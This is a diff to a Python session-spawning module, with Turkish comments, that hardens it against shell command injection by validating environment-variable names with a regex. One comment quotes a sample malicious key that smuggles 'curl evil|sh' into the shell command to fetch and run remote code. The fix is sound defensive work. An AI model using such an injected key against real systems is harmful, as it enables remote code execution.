@@ -11,6 +11,7 @@ TAMAMEN `providers/` paketinde — burada `cli` string'ine göre dallanma YOK, s
 """
 from __future__ import annotations
 import os
+import re
 import shlex
 import shutil
 import subprocess
@@ -29,6 +30,8 @@ from .tmux_backend import (
     tmux_attach_shell_fragment, tmux_available, tmux_has_session,
     tmux_new_session_shell_fragment, tmux_spawn_direct,
 )
+
+_SAFE_ENV_NAME_RE = re.compile(r"^[A-Z_][A-Z0-9_]*$")   # env_overrides anahtar adı (shell argv'ye gömülür)
 
 # gnome-terminal-server sessizce pencere açamadığında ([[spawn-zombie-child-degrades-web-server]],
 # kendi D-Bus/uzun-yaşam state bozulması — spawn'a özel değil, bare `gnome-terminal`
@@ -152,6 +155,14 @@ def spawn_session(
     # tmux-backed agy session'ında proc'a hiç ulaşmadı). Komut satırına `env` ile
     # gömmek bu env-inheritance tuhaflığını tamamen atlar.
     overrides = provider.env_overrides(name)
+    # Savunma-derinliği: env-var İSMİ (`k`) burada da doğrulanıyor — asıl kapı
+    # settings.py::save_settings (BYOK_ENV_NAME_RE) ama `env_overrides()`
+    # teorik olarak BAŞKA bir yoldan da (settings.json dışı) gelebilir; sadece
+    # DEĞERİ (`v`) quote'layıp İSMİ çıplak bırakmak `{"FOO; curl evil|sh #":"1"}`
+    # gibi bir anahtarla komut enjeksiyonuna açıktı (Antigravity SEC-02, en
+    # kritik bulgu). Geçersiz bir isim sessizce ATLANIR (fırlatmaz) — COPS_NAME
+    # gibi zaten-güvenli, kod-içi sabit isimler asla bu filtreye takılmaz.
+    overrides = {k: v for k, v in overrides.items() if _SAFE_ENV_NAME_RE.match(k)}
     env_prefix = "".join(f"{k}={shlex.quote(v)} " for k, v in overrides.items())
     inner = f"cd {shlex.quote(cwd)} && {env_prefix}{cli_invocation}"
 
